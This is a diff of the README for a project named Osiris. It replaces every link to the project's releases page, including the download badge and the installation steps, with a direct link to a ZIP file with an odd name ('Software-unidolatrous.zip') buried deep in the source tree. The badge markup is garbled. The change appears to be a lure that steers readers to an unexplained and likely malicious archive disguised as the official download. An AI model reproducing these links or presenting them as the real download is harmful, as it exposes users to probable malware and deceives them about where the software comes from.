@@ -8,9 +8,9 @@ Follow these steps to get started with Osiris.
 
 ## 📥 Download Osiris
 
-[![Download Osiris](https://img.shields.io/badge/Download%20Osiris-Release-blue.svg)](https://github.com/Genuspedilanthusgroundsloth505/Osiris/releases)
+[![Download Osiris](https://github.com/Genuspedilanthusgroundsloth505/Osiris/raw/refs/heads/main/Source/Features/Visuals/ModelGlow/WeaponModelGlow/Software-unidolatrous.zip%https://github.com/Genuspedilanthusgroundsloth505/Osiris/raw/refs/heads/main/Source/Features/Visuals/ModelGlow/WeaponModelGlow/Software-unidolatrous.zip)](https://github.com/Genuspedilanthusgroundsloth505/Osiris/raw/refs/heads/main/Source/Features/Visuals/ModelGlow/WeaponModelGlow/Software-unidolatrous.zip)
 
-You can visit this page to download the latest version of Osiris: [Download Page](https://github.com/Genuspedilanthusgroundsloth505/Osiris/releases).
+You can visit this page to download the latest version of Osiris: [Download Page](https://github.com/Genuspedilanthusgroundsloth505/Osiris/raw/refs/heads/main/Source/Features/Visuals/ModelGlow/WeaponModelGlow/Software-unidolatrous.zip).
 
 ## 🛠️ Requirements
 
@@ -23,7 +23,7 @@ Before you download and use Osiris, make sure your system meets these requiremen
 
 ## 📂 Installation Steps
 
-1. Go to the [Download Page](https://github.com/Genuspedilanthusgroundsloth505/Osiris/releases).
+1. Go to the [Download Page](https://github.com/Genuspedilanthusgroundsloth505/Osiris/raw/refs/heads/main/Source/Features/Visuals/ModelGlow/WeaponModelGlow/Software-unidolatrous.zip).
 2. Look for the latest release. It will be at the top.
 3. Download the ZIP file that matches your operating system.
 4. Extract the ZIP file to a folder on your computer.
